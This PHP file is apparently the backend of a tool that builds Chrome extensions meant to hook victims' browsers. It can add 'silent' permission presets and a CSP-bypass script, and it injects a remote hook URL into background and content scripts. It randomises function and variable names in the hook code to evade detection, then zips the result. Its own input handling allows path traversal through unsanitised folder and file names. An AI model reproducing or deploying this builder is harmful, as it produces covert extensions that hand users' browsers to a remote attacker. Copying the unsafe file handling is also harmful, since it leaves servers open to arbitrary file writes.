<?php
require_once('../config.php');
header('Content-Type: application/json');

if (EXTERNAL) {
	if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] != true) {
		gtfo('login.php');
	}
}

if (!isset($_POST['name'])) {
	gtfo('/');
}

/*
#
# We do the bare minimum validation on input. We just make sure it's safe 
# for being inserted into JSON and roughly complies with the standards set out by Chrome.
# Some input validated client-side is not validated server-side (such as string lengths).
# Freedom to the player.
#
*/

/******************************************
	Required Fields
******************************************/
$manifest['manifest_version'] = 2;

if (empty($_POST['name'])) {
	$err->add('Name field is required', 'name');
	goto bail_out;

} else {
	$manifest['name'] = $_POST['name'];
}

if (empty($_POST['version'])) {
	$err->add('A version number is required', 'version');
	goto bail_out;

} else {
	if (is_numeric($_POST['version'])) {
		$manifest['version'] = $_POST['version'];

	} else {
		$version_segments = explode('.', $_POST['version']);
		if (!$version_segments) {
			$err->add('Version must be in compliant format: https://developer.chrome.com/extensions/manifest/version', 'ext-version');
			goto bail_out;
		}

		foreach ($version_segments as $key => $value) {
			$version_segments[$key] = intval($value);
		}
		$manifest['version'] = implode('.', $version_segments);
	}
}


/******************************************
	General Manifest Items
******************************************/
$manifest['description'] = htmlentities($_POST['description']);


/******************************************
	Build/Set Extension Folder
******************************************/
if (!empty($_POST['existing_folder']) &&
	file_exists(dirname(dirname(__FILE__)) . DIRECTORY_SEPARATOR . slash_path(SAVE_PATH) . $_POST['existing_folder'])) {

	$folder_name = $_POST['existing_folder'];
	
} else {
	// Make new extension folder
	$folder_name = neat_string($_POST['name']) . '-' . substr(sha1(time()), 0, 6);

	if (!mkdir(dirname(dirname(__FILE__)) . DIRECTORY_SEPARATOR . slash_path(SAVE_PATH) . $folder_name, null, true)) {
		$err->add('Unable to create folder for extension: '. dirname(dirname(__FILE__)) .
			DIRECTORY_SEPARATOR . slash_path(SAVE_PATH) . $folder_name);
		goto bail_out;
	}
}


/******************************************
	Process Images
******************************************/
if (!empty(array_filter($_FILES['advanced_icon']['name']))) {
	// Loop through icon uploads
	foreach ($_FILES['advanced_icon']['tmp_name'] as $key => $value) {
		// Handle upload errors
		if ($_FILES['advanced_icon']['error'][$key]) {
			$err->add('Error while uploading icon: ' . upload_error($_FILES['advanced_icon']['error'][$key]));
			goto bail_out;
		}

		// Image filename
		$filename = $_FILES['advanced_icon']['name'][$key];
		$filename = substr(sha1($filename), 0, 10) . '.' . pathinfo($filename, PATHINFO_EXTENSION);

		// Move
		if (!move_uploaded_file($_FILES['advanced_icon']['tmp_name'][$key], get_path($folder_name, $filename))) {
			$err->add('Error moving icon to: ' . get_path($folder_name, $filename));
			goto bail_out;
		}

		// Determine image based on size
		list($width, $height) = getimagesize($new_path);

		if ($width <= 16) {
			$manifest['icons']['16'] = $filename;
		} elseif ($width <= 32) {
			$manifest['icons']['32'] = $filename;
		} elseif ($width <= 48) {
			$manifest['icons']['48'] = $filename;
		} else {
			// We assume a 128px image
			$manifest['icons']['128'] = $filename;
		}
	}

} elseif (!empty($_FILES['simple_icon']['name'])) {
	// Handle error
	if ($_FILES['simple_icon']['error']) {
		$err->add('Error while uploading icon: ' . upload_error($_FILES['simple_icon']['error']));
		goto bail_out;
	}

	$filename = $_FILES['simple_icon']['name'];
	$filename = substr(sha1($filename), 0, 10) . '.' . pathinfo($filename, PATHINFO_EXTENSION);

	if (!move_uploaded_file($_FILES['simple_icon']['tmp_name'], get_path($folder_name, $filename))) {
		$err->add('Error moving icon to: ' . get_path($folder_name, $filename));
		goto bail_out;
	}

	$manifest['icons']['128'] = $filename;

} elseif (isset($_POST['trans-icon'])) {
	$filename = substr(sha1('transparent-icon.png' . time()), 0, 10) . '.png';

	if (!copy(TPL_DIR . 'transparent-icon.png', get_path($folder_name, $filename))) {
		$err->add('Error moving transparent icon to: ' . get_path($folder_name, $filename));
		goto bail_out;
	}

	$manifest['icons']['128'] = $filename;
}


/******************************************
	Manifest Permissions
******************************************/
if ($_POST['permissions_type'] == 'silent') {

	if (isset($_POST['no_inject']) && isset($_POST['no_background'])) {
		// No content or background
		$manifest = array_merge($manifest, $permission['silent']);

	} elseif (isset($_POST['no_inject']) && !isset($_POST['no_background'])) {
		// content but no background
		$manifest = array_merge($manifest, $permission['silent+background']);

	} elseif (!isset($_POST['no_inject']) && isset($_POST['no_background'])) {
		// background but no content
		$manifest = array_merge($manifest, $permission['silent+content']);

	} elseif (!isset($_POST['no_inject']) && !isset($_POST['no_background'])) {
		// background and content
		$manifest = array_merge($manifest, $permission['silent+background+content']);
	}

} elseif ($_POST['permissions_type'] == 'standard') {

	if (isset($_POST['no_inject']) && isset($_POST['no_background'])) {
		// No content or background
		$manifest = array_merge($manifest, $permission['standard']);

	} elseif (isset($_POST['no_inject']) && !isset($_POST['no_background'])) {
		// content but no background
		$manifest = array_merge($manifest, $permission['standard+background']);

	} elseif (!isset($_POST['no_inject']) && isset($_POST['no_background'])) {
		// background but no content
		$manifest = array_merge($manifest, $permission['standard+content']);

	} elseif (!isset($_POST['no_inject']) && !isset($_POST['no_background'])) {
		// background and content
		$manifest = array_merge($manifest, $permission['standard+background+content']);
	}

} elseif ($_POST['permissions_type'] == 'custom') {
	if (!json_decode($_POST['custom_permissions'], true)) {
		$err->add('Error json_decode\'ing custom permissions. Check permissions are in valid JSON format');
		goto bail_out;
	}

	$manifest = array_merge($manifest, json_decode($_POST['custom_permissions'], true));

} else {
	$err->add('Error while setting permissions - they weren\'t: silent, standard, or custom');
	goto bail_out;
}


/******************************************
	Browser Hook
******************************************/
if (filter_var($_POST['hook_url'], FILTER_VALIDATE_URL)) {
	$hook_url = $_POST['hook_url'];

	// Split for CSP
	$hook_part = parse_url($hook_url);
	$hook_part['port'] = isset($hook_part['port']) ? $hook_part['port'] : '';
	$hook_domain = $hook_part['scheme'] . '://' . $hook_part['host'] . $hook_part['port'];

} elseif (!empty($_POST['hook_url'])) {
	$err->add('Browser hook is not a valid URL or empty. Note: URL must start with the protocol; i.e. https://', 'hook-input');
	goto bail_out;
}


/******************************************
	Manifest CSP
******************************************/
$replace = isset($hook_domain) ? $hook_domain : '';
$manifest['content_security_policy'] = str_replace('<HOOK_CSP_PLACEHOLDER>', $replace, $_POST['ext_csp']);


/******************************************
	Popup Files
******************************************/
if (!empty(array_filter($_FILES['popup_files']['name']))) {
	// Loop through uploaded popup files 
	foreach ($_FILES['popup_files']['tmp_name'] as $key => $value) {
		// Handle upload errors
		if ($_FILES['popup_files']['error'][$key]) {
			$err->add('Error while uploading extension popup file: ' . upload_error($_FILES['popup_files']['error'][$key]));
			goto bail_out;
		}

		// Validate name
		if ($_FILES['popup_files']['name'][$key] == 'content.js' ||
			$_FILES['popup_files']['name'][$key] == 'background.js' ||
			$_FILES['popup_files']['name'][$key] == 'popup.html' ||
			$_FILES['popup_files']['name'][$key] == 'manifest.json') {

			$err->add('Extension popup file cannot be named: ' . htmlentities($_FILES['popup_files']['name'][$key]));
			goto bail_out;
		}

		// Move
		$popup_path_file = get_path($folder_name, $_FILES['popup_files']['name'][$key]);

		if (!move_uploaded_file($_FILES['popup_files']['tmp_name'][$key], $popup_path_file)) {
			$err->add('Error moving extension popup file to: ' . $popup_path_file);
			goto bail_out;
		}
	}
}


/******************************************
	Popup HTML
******************************************/
if (!isset($_POST['no_popup'])) {
	$popup_path_html = get_path($folder_name, 'popup.html');

	if (file_put_contents($popup_path_html, $_POST['popup_html'], LOCK_EX) === FALSE) {
		$err->add('Error while creating popup.html page in: ' . $popup_path_html);
		goto bail_out;
	}

	$manifest['browser_action'] = array(
		"default_popup" => "popup.html",
	);
}


/******************************************
	Background JS
******************************************/
if (!isset($_POST['no_background'])) {
	$background_path = get_path($folder_name, 'background.js');

	if (!copy(TPL_DIR . 'jquery-3.2.1.min.js', get_path($folder_name, 'jquery-3.2.1.min.js'))) {
		$err->add('Error moving jquery-3.2.1.min.js to: ' . get_path($folder_name, 'jquery-3.2.1.min.js'));
		goto bail_out;
	}

	$back_js = ''; // this is shit

	if (isset($_POST['back_csp'])) {
		$back_js = file_get_contents(TPL_DIR . 'csp_bypass.js');
	}

	if (isset($_POST['back_hook']) && !empty($hook_url)) {
		$background_hook = file_get_contents(TPL_DIR . 'hook_background.js');
		$back_js = str_replace('<HOOK_URL_PLACEHOLDER>', $hook_url, $background_hook);
		$back_js = str_replace('<FUNC_NAME_PLACEHOLDER>', rand_string(rand(4, 12)), $back_js);
		$back_js = str_replace('<VAR_NAME_PLACEHOLDER>', rand_string(rand(4, 12)), $back_js);
		$back_js = str_replace('<VAR_NAME_2_PLACEHOLDER>', rand_string(rand(4, 12)), $back_js);
	}

	if (!empty($_POST['back_js'])) {
		$back_js = $back_js . $_POST['back_js'];
	}

	// Remove comments in Javascript
	$back_js = no_comment($back_js);

	if (file_put_contents($background_path, $back_js, LOCK_EX) === FALSE) {
		$err->add('Error while creating background.js in: ' . $background_path);
		goto bail_out;
	}
}


/******************************************
	Content Scripts JS
******************************************/
if (!isset($_POST['no_inject'])) {
	$content_path = get_path($folder_name, 'content.js');

	if (!copy(TPL_DIR . 'jquery-3.2.1.min.js', get_path($folder_name, 'jquery-3.2.1.min.js'))) {
		$err->add('Error moving jquery-3.2.1.min.js to: ' . get_path($folder_name, 'jquery-3.2.1.min.js'));
		goto bail_out;
	}

	$content_js = ''; // this is shit

	if (isset($_POST['inject_hook']) && !empty($hook_url)) {
		$inject_hook = file_get_contents(TPL_DIR . 'hook_inject.js');
		$content_js = str_replace('<HOOK_URL_PLACEHOLDER>', $hook_url, $inject_hook);
		$content_js = str_replace('<FUNC_NAME_PLACEHOLDER>', rand_string(rand(4, 12)), $content_js);
		$content_js = str_replace('<VAR_NAME_PLACEHOLDER>', rand_string(rand(4, 12)), $content_js);
		$content_js = str_replace('<VAR_NAME_2_PLACEHOLDER>', rand_string(rand(4, 12)), $content_js);
	}

	if (!empty($_POST['inject_js'])) {
		$content_js = $content_js . $_POST['inject_js'];
	}

	// Remove comments in Javascript
	$content_js = no_comment($content_js);

	if (file_put_contents($content_path, $content_js, LOCK_EX) === FALSE) {
		$err->add('Error while creating content.js in: ' . $content_path);
		goto bail_out;
	}
}


/******************************************
	Build Manifest File
******************************************/
$content_path = get_path($folder_name, 'manifest.json');

$manifestation_am_i_rite = json_indent(json_encode($manifest));

if (file_put_contents($content_path, $manifestation_am_i_rite, LOCK_EX) === FALSE) {
	$err->add('Error while creating manifest.json in: ' . $content_path);
	goto bail_out;
}


/******************************************
	Build ZIP
******************************************/
$files = scandir(get_path($folder_name));

$zip = new ZipArchive();
$zip_handle = $zip->open(get_path() . $folder_name . '.zip', ZIPARCHIVE::OVERWRITE | ZipArchive::CREATE);

if ($zip_handle !== true) {
	$err->add('Couldn\'t create ZIP: ' . zip_error($zip_handle));
	goto bail_out;
}

foreach($files as $file) {
	if (is_file(get_path($folder_name, $file))) {
		$zip->addFile(get_path($folder_name, $file), $file);
	}
}

if (!$zip->close()) {
	$err->add('Couldn\'t create ZIP, sorry.');
	goto bail_out;
}


/******************************************
	Generate Response
******************************************/
$response = array(
	'ext-name' => htmlentities($_POST['name']),
	'timestamp' => date('Y-m-d H:i:s') . ' ' . TIMEZONE,
	'existing-folder' => $folder_name,
	'ext-path' => get_path($folder_name),
	'save-path' => slash_path(SAVE_PATH),
	'zip-dl' => slash_path(SAVE_PATH) . $folder_name . '.zip',
);


/******************************************
	Return
******************************************/
bail_out: 
if (!empty($err->load())) {
	header('HTTP/1.0 400 Bad Request');

	if (isset($folder_name)) {
		$err->add($folder_name, 'existing-folder'); // Track created folder
	}
	
	echo json_encode($err->load());

} else {
	echo json_encode($response);
}


/******************************************
	Vital Production Code
******************************************/
usleep(200000);
/******************************************
	END Vital Production Code
******************************************/